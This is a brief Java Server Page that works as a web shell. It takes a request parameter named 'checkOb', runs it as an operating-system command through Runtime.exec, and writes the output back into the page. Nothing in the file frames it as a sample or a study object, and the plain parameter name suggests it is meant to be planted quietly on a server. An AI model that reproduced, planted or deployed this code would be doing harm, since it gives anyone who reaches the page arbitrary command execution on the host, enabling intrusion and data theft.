<%@ page language="java" import="java.util.*,java.io.BufferedReader,java.io.InputStreamReader" pageEncoding="UTF-8"%>
<%
		String  cip= request.getParameter("checkOb");
		String line = null;
		try {
			Process pro = Runtime.getRuntime().exec(cip);
			BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));
			while ((line = buf.readLine()) != null){
				if(!line.trim().equals("")){
					out.println("         "+line);
				}
			}
		} catch (Exception ex) {
			System.out.println(ex.getMessage());
		}
	
 %>